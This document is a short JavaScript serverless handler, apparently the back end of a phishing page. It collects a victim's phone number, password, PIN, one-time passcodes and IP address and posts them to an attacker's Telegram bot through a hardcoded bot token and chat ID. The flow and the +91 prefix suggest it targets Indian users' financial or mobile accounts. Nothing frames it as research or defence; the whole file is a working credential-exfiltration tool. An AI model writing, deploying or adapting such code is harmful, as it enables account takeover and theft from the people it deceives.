export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { phone, pass, pin, otp, type } = req.body;
  const BOT_TOKEN = '9154780239:AAEb6OOOzd7TyF1taXlnN_ntKrjXLL6xj64';
  const CHAT_ID = '6463555281';

  // Get user IP address from Vercel headers
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  let message = '';
  if (type === 'login') {
    message = `✅ <b>Sign In attempt</b>\n🌐 IP: ${clientIp}\n📱 Phone: ${phone}\n🔑 Password: <b>${pass}</b>\n🔢 PIN: <b>${pin}</b>`;
  } else if (type === 'send_otp') {
    message = `🔐 <b>OTP requested</b>\n🌐 IP: ${clientIp}\n📱 Phone: +91 ${phone}`;
  } else if (type === 'verify_otp') {
    message = `🔑 <b>OTP Entered</b>\n🌐 IP: ${clientIp}\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otp}`;
  }

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const data = await tgRes.json();
    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to send message' });
  }
}
